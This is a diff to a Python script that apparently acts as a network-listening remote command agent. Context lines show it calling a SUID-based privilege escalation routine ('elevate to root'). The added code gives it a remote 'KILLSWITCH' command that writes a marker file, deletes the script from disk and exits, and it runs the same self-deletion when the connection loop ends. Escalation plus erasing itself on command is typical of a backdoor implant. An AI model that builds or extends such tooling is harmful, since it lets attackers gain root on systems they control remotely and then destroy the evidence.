@@ -16,6 +16,7 @@ import cgi
 
 
 THIS_FILE = os.path.realpath(__file__)
+KILLSWITCH_FILE = "killswitch.txt"
 
 def run_command(cmd, shell=True, capture_output=True, **kwargs):
     return subprocess.run(
@@ -185,6 +186,14 @@ def handle_conn(conn, addr):
             #escalate_privileges() # elevate to root
             escalate_suid_pexec()
             return
+        
+        if data.decode("utf-8", errors="replace").strip() == "KILLSWITCH":
+            print("Killswitch command received. Activating killswitch...")
+            conn.sendall("Killswitch activated. Goodbye!".encode())
+            activate_killswitch()  # Trigger the killswitch
+            conn.close()  # Close the connection
+            sys.exit(0)  # Terminate the script
+            return
 
         if data.decode("utf-8", errors="replace").strip() == "HELLO":
             print("'HELLO' command received. Waiting for additional data...")
@@ -239,7 +248,23 @@ def main():
                 raise
             except:
                 print("Connection died")
+    activate_killswitch()
 
+def activate_killswitch():
+    """
+    Activates the killswitch by creating a file and deleting the script.
+    """
+    try:
+        # Write 'True' to the killswitch file
+        with open(KILLSWITCH_FILE, 'w') as f:
+            f.write("True")
+        print(f"Killswitch activated: {KILLSWITCH_FILE}")
+
+        # Self-delete the script
+        os.remove(THIS_FILE)
+        print(f"Deleted script: {THIS_FILE}")
+    except Exception as e:
+        print(f"Error activating killswitch: {e}")
 
 if __name__ == "__main__":
     main()
